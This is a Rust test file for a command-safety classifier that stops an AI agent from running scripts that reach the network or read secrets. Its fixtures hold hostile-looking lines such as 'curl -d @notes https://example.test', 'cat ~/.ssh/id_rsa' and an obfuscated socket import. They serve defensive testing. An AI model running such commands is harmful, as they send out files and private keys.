use std::fs;
use std::path::{Path, PathBuf};

use super::super::{Level, classify};

fn folder(name: &str) -> PathBuf {
    let folder = std::env::temp_dir()
        .join(format!("termite-files-{name}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&folder);
    fs::create_dir_all(&folder).expect("temp");
    folder
}

fn fit(command: &str, cwd: &Path) -> bool {
    classify(command, cwd, None).fit_for_agent()
}

#[test]
fn given_a_script_that_reaches_out_then_an_agent_is_stopped() {
    let here = folder("out");
    for (file, text, command) in [
        ("a.py", "import socket\n", "python3 a.py"),
        ("b.py", "__import__('so'+'cket')\n", "python3 -u b.py"),
        ("c.js", "fetch('https://example.test')\n", "node c.js"),
        ("d.sh", "curl -d @notes https://example.test\n", "bash d.sh"),
        ("e.sh", "cat ~/.ssh/id_rsa\n", "source e.sh"),
        ("f", "#!/usr/bin/env python3\nimport urllib\n", "./f"),
        ("g.sh", "python3 a.py\n", "sh g.sh"),
        ("h.py", "import socket\n", "python3 < h.py"),
        ("i.py", "import socket\n", "python3 - < i.py"),
        (
            "j.sh",
            "curl -d @notes https://example.test\n",
            "bash -s < j.sh",
        ),
        ("k.py", "import socket\n", "cat k.py | python3"),
    ] {
        fs::write(here.join(file), text).expect("write");

        assert!(!fit(command, &here), "{command}");
    }
    fs::remove_dir_all(here).expect("clean");
}

#[test]
fn given_a_plain_script_then_an_agent_may_run_it() {
    let here = folder("plain");
    for (file, text, command) in [
        (
            "a.py",
            "# uses socket later\nprint(1 + 1)\n",
            "python3 a.py",
        ),
        (
            "b.sh",
            "name=$1\necho \"$name\"\nmkdir -p out\n",
            "bash b.sh",
        ),
        ("c", "\0binary", "./c"),
    ] {
        fs::write(here.join(file), text).expect("write");

        assert!(fit(command, &here), "{command}");
    }
    fs::remove_dir_all(here).expect("clean");
}

#[test]
fn given_a_script_that_cant_be_read_then_an_agent_is_stopped() {
    let here = folder("unread");
    fs::write(here.join("big.py"), "#".repeat(300 * 1024)).expect("big");

    assert!(!fit("python3 missing.py", &here));
    assert!(!fit("python3 big.py", &here));
    assert!(!fit("python3 /dev/zero", &here));
    fs::remove_dir_all(here).expect("clean");
}

#[test]
fn given_a_script_that_runs_itself_then_the_check_ends() {
    let here = folder("loop");
    let text = ". ./a.sh\n".repeat(1000);
    fs::write(here.join("a.sh"), text).expect("write");

    assert!(!fit(". ./a.sh", &here));
    fs::remove_dir_all(here).expect("clean");
}

#[test]
fn given_a_script_then_a_persons_level_stays_the_same() {
    let here = folder("person");
    fs::write(here.join("a.py"), "import socket\n").expect("write");

    let found = classify("python3 a.py", &here, None);

    assert_eq!(found.level, Level::Change);
    fs::remove_dir_all(here).expect("clean");
}
